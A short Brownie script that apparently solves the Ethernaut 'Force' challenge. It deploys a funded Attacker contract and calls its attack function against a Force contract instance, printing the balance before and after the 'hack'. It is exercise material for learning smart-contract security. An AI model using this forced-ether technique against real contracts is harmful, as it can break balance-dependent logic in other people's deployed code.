from brownie import Force, Attacker, Contract, accounts

INSTANCE_ADDRESS = "0x95A2A2f3cF73FfD1241af6D9F4a699Bc73DB217A"
ACCOUNT = "straul"


def get_account():
    account = accounts.load("straul")
    return account


def hack_force(account):
    force = Contract.from_abi(name="Force", address=INSTANCE_ADDRESS, abi=Force.abi)
    attacker = Attacker.deploy({"from": account, "value": "1 finney"})

    print(f"Balance of Force contract before hack: {force.balance()}")
    attacker.attack(force.address, {"from": account})
    print(f"Balance of Force contract after hack: {force.balance()}")


def main():
    account = get_account()
    hack_force(account)